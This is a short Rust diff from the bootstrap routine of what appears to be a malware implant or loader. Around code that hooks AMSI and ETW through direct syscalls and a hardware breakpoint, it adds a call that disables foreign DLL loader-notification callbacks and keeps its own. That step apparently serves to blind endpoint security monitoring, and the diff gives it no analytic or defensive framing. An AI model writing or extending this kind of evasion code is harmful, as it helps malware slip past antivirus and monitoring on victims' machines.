@@ -326,6 +326,9 @@ unsafe fn bootstrap() -> Option<Instance> {
     // through loader notifications (Dr3 — the ETW hooks left it free).
     if config::HOOKS {
         crate::runtime::amsi::install(peb, ntdll, &syscall_table, &mut etw_hooks);
+        // dll-notify: disable foreign loader-notification callbacks (ours
+        // stays); best effort, never fatal.
+        let _unhooked = crate::runtime::amsi::unhook_foreign_notifications(ntdll);
     }
     crate::runtime::debug::log_handle(dbg, b"bs: amsi ok\n");
     stage_gate(8);
